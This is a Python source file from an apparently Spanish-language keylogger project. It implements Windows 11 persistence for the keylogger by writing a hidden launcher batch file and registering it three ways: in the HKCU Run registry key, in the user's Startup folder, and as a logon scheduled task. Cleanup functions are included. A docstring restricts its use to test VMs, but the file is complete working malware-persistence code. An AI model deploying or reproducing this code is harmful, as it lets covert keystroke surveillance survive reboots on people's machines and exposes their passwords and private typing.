"""
persistence.py
Mecanismos para que el keylogger sobreviva a reinicios.

Para **Windows 11** (objetivo actual del proyecto):
- Entrada en HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
- Carpeta de Inicio del usuario (respaldo)
- Tarea programada al iniciar sesión (opcional)

IMPORTANTE: Este código solo debe ejecutarse dentro de tus VMs de pruebas.
"""

import os
import shutil
import subprocess
import sys

from config import APP_NAME

try:
    from app_paths import get_default_entrypoint
except ImportError:
    get_default_entrypoint = None

try:
    import winreg
    IS_WINDOWS = True
except ImportError:
    IS_WINDOWS = False

LAUNCHER_BAT = "run_keylogger.bat"


def _is_real_executable(path: str) -> bool:
    """Evita aliases de 0 bytes de la Microsoft Store (no funcionan al arranque)."""
    return bool(path) and os.path.isfile(path) and os.path.getsize(path) > 0


def resolve_pythonw() -> str:
    """
    Obtiene la ruta real a pythonw.exe / pythonw3.x.exe.
    sys.executable suele apuntar al alias de WindowsApps, que falla en el Run key.
    """
    if IS_WINDOWS:
        try:
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Python\PythonCore",
            ) as versions_key:
                index = 0
                best_pythonw = None
                while True:
                    try:
                        version = winreg.EnumKey(versions_key, index)
                        index += 1
                    except OSError:
                        break

                    try:
                        with winreg.OpenKey(
                            versions_key,
                            rf"{version}\InstallPath",
                        ) as install_key:
                            pythonw, _ = winreg.QueryValueEx(
                                install_key, "WindowedExecutablePath"
                            )
                            if _is_real_executable(pythonw):
                                best_pythonw = pythonw
                    except OSError:
                        continue

                if best_pythonw:
                    return best_pythonw
        except OSError:
            pass

    python_dir = os.path.dirname(os.path.abspath(sys.executable))
    for name in ("pythonw.exe", "pythonw3.13.exe", "pythonw3.12.exe", "python.exe"):
        candidate = os.path.join(python_dir, name)
        if _is_real_executable(candidate):
            return candidate

    for name in ("pythonw.exe", "pythonw3.13.exe", "python.exe"):
        found = shutil.which(name)
        if _is_real_executable(found):
            return found

    return sys.executable


def resolve_script_path(exe_path: str = None) -> str:
    if exe_path is None:
        exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
    return os.path.abspath(exe_path)


def create_launcher_bat(script_path: str = None) -> str:
    """
    Crea un .bat en la misma carpeta del script.
    Windows ejecuta .bat de forma más confiable que aliases de pythonw al iniciar sesión.
    """
    script_path = resolve_script_path(script_path)
    script_dir = os.path.dirname(script_path)
    bat_path = os.path.join(script_dir, LAUNCHER_BAT)

    if script_path.lower().endswith(".py"):
        pythonw = resolve_pythonw()
        inner = f'"{pythonw}" "{script_path}"'
    else:
        inner = f'"{script_path}"'

    # Espera breve: al reiniciar, carpetas compartidas (Y:) pueden no estar listas aún.
    content = (
        "@echo off\r\n"
        "timeout /t 15 /nobreak >nul\r\n"
        f'cd /d "{script_dir}"\r\n'
        f"start \"\" /B {inner}\r\n"
    )

    with open(bat_path, "w", encoding="utf-8", newline="\r\n") as handle:
        handle.write(content)

    print(f"[+] Launcher creado: {bat_path}")
    return bat_path


def add_to_registry(launcher_path: str = None) -> bool:
    """Registra el .bat en HKCU Run (mecanismo principal del proyecto)."""
    if not IS_WINDOWS:
        print("[-] add_to_registry solo funciona en Windows")
        return False

    if launcher_path is None:
        launcher_path = create_launcher_bat()

    launcher_path = os.path.abspath(launcher_path)
    command = f'"{launcher_path}"'

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
        print(f"[+] Persistencia añadida al registro: {APP_NAME}")
        print(f"    Comando registrado: {command}")
        return True
    except Exception as exc:
        print(f"[-] Error al añadir persistencia: {exc}")
        return False


def add_to_startup_folder(launcher_path: str = None) -> bool:
    """Copia el launcher a la carpeta de Inicio del usuario (respaldo)."""
    if not IS_WINDOWS:
        return False

    if launcher_path is None:
        launcher_path = create_launcher_bat()

    launcher_path = os.path.abspath(launcher_path)
    startup_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        r"Microsoft\Windows\Start Menu\Programs\Startup",
    )
    os.makedirs(startup_dir, exist_ok=True)

    dest = os.path.join(startup_dir, LAUNCHER_BAT)
    shutil.copy2(launcher_path, dest)
    print(f"[+] Copiado a carpeta de Inicio: {dest}")
    return True


def add_scheduled_task(launcher_path: str = None) -> bool:
    """Crea una tarea al iniciar sesión apuntando al .bat (sin problemas de comillas)."""
    if not IS_WINDOWS:
        print("[-] add_scheduled_task solo funciona en Windows")
        return False

    if launcher_path is None:
        launcher_path = create_launcher_bat()

    launcher_path = os.path.abspath(launcher_path)
    task_name = APP_NAME

    subprocess.run(
        ["schtasks", "/delete", "/tn", task_name, "/f"],
        capture_output=True,
        text=True,
    )

    result = subprocess.run(
        [
            "schtasks",
            "/create",
            "/tn",
            task_name,
            "/tr",
            launcher_path,
            "/sc",
            "onlogon",
            "/f",
            "/it",
        ],
        capture_output=True,
        text=True,
    )

    if result.returncode == 0:
        print(f"[+] Tarea programada creada: {task_name}")
        print(f"    Se ejecutará: {launcher_path}")
        return True

    print("[-] Error creando tarea programada:")
    print(result.stderr.strip() or result.stdout.strip())
    return False


def install_persistence(script_path: str = None) -> bool:
    """
    Instala todos los mecanismos de persistencia.
    Retorna True si al menos el registro se configuró correctamente.
    """
    launcher_path = create_launcher_bat(script_path)
    registry_ok = add_to_registry(launcher_path)
    add_to_startup_folder(launcher_path)
    add_scheduled_task(launcher_path)
    return registry_ok


def remove_from_registry() -> bool:
    """Elimina la entrada del registro (útil para limpieza en VM)."""
    if not IS_WINDOWS:
        return False

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.DeleteValue(key, APP_NAME)
        winreg.CloseKey(key)
        print(f"[+] Persistencia eliminada del registro: {APP_NAME}")
        return True
    except FileNotFoundError:
        return True
    except Exception as exc:
        print(f"[-] Error al eliminar persistencia: {exc}")
        return False


def remove_persistence() -> None:
    """Limpia registro, carpeta de inicio y tarea programada."""
    remove_from_registry()

    startup_bat = os.path.join(
        os.environ.get("APPDATA", ""),
        r"Microsoft\Windows\Start Menu\Programs\Startup",
        LAUNCHER_BAT,
    )
    if os.path.exists(startup_bat):
        os.remove(startup_bat)
        print(f"[+] Eliminado de carpeta de Inicio: {startup_bat}")

    subprocess.run(
        ["schtasks", "/delete", "/tn", APP_NAME, "/f"],
        capture_output=True,
        text=True,
    )
    print(f"[+] Tarea programada eliminada (si existía): {APP_NAME}")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Gestión de persistencia del keylogger")
    parser.add_argument(
        "action",
        choices=["install", "remove", "test"],
        help="install=activar, remove=limpiar, test=mostrar rutas",
    )
    args = parser.parse_args()

    if get_default_entrypoint:
        default_script = get_default_entrypoint()
    else:
        default_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger.py")

    if args.action == "install":
        ok = install_persistence(default_script)
        raise SystemExit(0 if ok else 1)
    if args.action == "remove":
        remove_persistence()
    else:
        script = resolve_script_path(default_script)
        print(f"Script: {script}")
        print(f"Pythonw: {resolve_pythonw()}")
        bat = create_launcher_bat(script)
        print(f"Launcher: {bat}")